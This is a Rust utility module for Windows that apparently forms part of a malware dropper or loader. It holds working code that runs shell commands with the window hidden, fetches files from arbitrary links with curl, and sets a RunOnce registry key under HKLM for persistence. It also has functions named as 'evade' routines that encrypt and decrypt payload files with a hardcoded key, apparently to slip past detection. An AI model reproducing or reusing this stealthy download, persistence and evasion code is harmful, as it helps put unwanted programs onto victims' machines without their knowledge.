#![allow(dead_code)]

use sha2::{
    Digest,
    Sha256,
};
use std::{
    io::{self, Read, Write},
    fs::{OpenOptions, create_dir_all, remove_file},
    process::Command,
    os::windows::process::CommandExt,
    path::{Path, PathBuf},
    thread,
    time,
};
use zip::ZipArchive;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha8Poly1305, Nonce
};
use crate::constants::{
    NO_WINDOW,
    utils::{KEY, NONCE},
};

pub fn verify_file<P: AsRef<Path>>(filepath: P, hash: &[u8]) -> io::Result<bool> {
    match hash_file(filepath) {
        Ok(file_hash) => return Ok(&file_hash == hash),
        Err(error) => return Err(error),
    }
}

pub fn hash_file<P: AsRef<Path>>(filepath: P) -> io::Result<Vec<u8>> {
    let mut file = OpenOptions::new().read(true).open(filepath)?;
    let mut hasher = Sha256::new();
    io::copy(&mut file, &mut hasher)?;
    let _hash = hasher.finalize();
    let _hash_array: &[u8] = _hash.as_ref();
    return Ok(_hash_array.to_owned());
}

pub fn download_file(path: Option<&Path>, link: &str, filename: &Path) -> io::Result<()> {
    let command: String = match path {
        Some(path) => {
            if !path.is_dir() {
                create_dir_all(path)?
            }
            format!("cd /D {} && curl --retry 3 --location {} --output {}", path.display(), link, filename.display())    
        },
        None => {
            format!("curl -L {} --output {}", link, filename.display())
        }
    };
    let mut child =Command::new("cmd")
    .creation_flags(NO_WINDOW)
    .args(["/C", &command])
    .spawn()?;
    let _result = child.wait()?;
    return Ok(());
}

pub fn extract_zip<P: AsRef<Path>, Q: AsRef<Path>>(source: P, destination: Q) -> io::Result<()> {
    let file = OpenOptions::new().read(true).open(source)?;
    let mut zip = ZipArchive::new(file)?;
    zip.extract(destination)?;
    return Ok(());
}

pub fn extract_zip_and_remove<P: AsRef<Path>, Q: AsRef<Path>>(source: P, destination: Q) -> io::Result<()> {
    extract_zip(&source, &destination)?;
    remove_file(&source)?;
    return Ok(());
}

pub fn thread_sleep(seconds: f64) {
    thread::sleep(time::Duration::from_secs_f64(seconds));
}

pub fn cmd_with_output(command: &str) -> io::Result<String> {
    let command_output = Command::new("cmd").creation_flags(NO_WINDOW).args(["/C", command]).output()?;
    return Ok(String::from_utf8_lossy(&command_output.stdout).trim().to_owned());
}

pub fn cmd_without_output(command: &str) -> io::Result<()> {
    Command::new("cmd").creation_flags(NO_WINDOW).args(["/C", command]).spawn()?;
    return Ok(());
}

pub fn reg_add(filepath: &str) -> io::Result<String> {
    let command: String = format!("/C REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v LaunchArd /t REG_SZ /d \"{}\" /f", filepath);
    let command_output = Command::new("cmd").creation_flags(NO_WINDOW).raw_arg(&command).output()?;
    return Ok(String::from_utf8_lossy(&command_output.stdout).trim().to_owned());
}

pub fn replace_homedrive(path: &mut PathBuf, HOMEDRIVE : &str) {
    let path_str = path.to_str().unwrap_or("");
    if path_str.contains("$HOMEDRIVE") {*path = PathBuf::from(path_str.replace("$HOMEDRIVE", HOMEDRIVE));}
}
pub fn wait_for_internet_connection() {
    loop {
        match cmd_with_output("ping -n 1 8.8.8.8") {
            Ok(string) => {
                if string.contains("Request timed out.") || string.contains("Destination host unreachable.") {
                    thread_sleep(4.5)
                } else {
                    break;
                }
            },
            Err(..) => thread_sleep(4.5),
        }
    }
}

pub fn evade_encrypt_file<P: AsRef<Path>>(source: P) -> io::Result<()> {
    let mut buffer: Vec<u8> = Vec::new();
    let mut file = OpenOptions::new().read(true).open(&source)?;
    file.read_to_end(&mut buffer)?;

    let nonce = Nonce::from_slice(&NONCE);
    // We can unwrap this since we know the key is of valid length (32-bytes)
    let cipher = ChaCha8Poly1305::new_from_slice(&KEY).unwrap();
    
    let ciphertext = match cipher.encrypt(&nonce, buffer.as_ref()) {
        Ok(ciphertext) => ciphertext,
        Err(..) => return Err(io::Error::new(io::ErrorKind::Other, "[ERROR] failed to encrypt"))
    };

    let mut output_filepath: PathBuf = PathBuf::from(source.as_ref());
    output_filepath.set_extension(".czip");
    let mut file = OpenOptions::new().write(true).create(true).truncate(true).open(&output_filepath)?;
    file.write_all(&ciphertext)?;

    return Ok(());
}

pub fn evade_decrypt_move_file<P: AsRef<Path>, Q: AsRef<Path>>(source: P, destination: Q) -> io::Result<()> {
    let mut buffer: Vec<u8> = Vec::new();
    let mut file = OpenOptions::new().read(true).open(&source)?;
    file.read_to_end(&mut buffer)?;

    let nonce = Nonce::from_slice(&NONCE);
    // We can unwrap this since we know the key is of valid length (32-bytes)
    let cipher = ChaCha8Poly1305::new_from_slice(&KEY).unwrap();
    
    let plaintext = match cipher.decrypt(&nonce, buffer.as_ref()) {
        Ok(plaintext) => plaintext,
        Err(..) => return Err(io::Error::new(io::ErrorKind::Other, "[ERROR] failed to decrypt"))
    };

    let mut file = OpenOptions::new().write(true).create(true).truncate(true).open(&destination)?;
    file.write_all(&plaintext)?;

    return Ok(());
}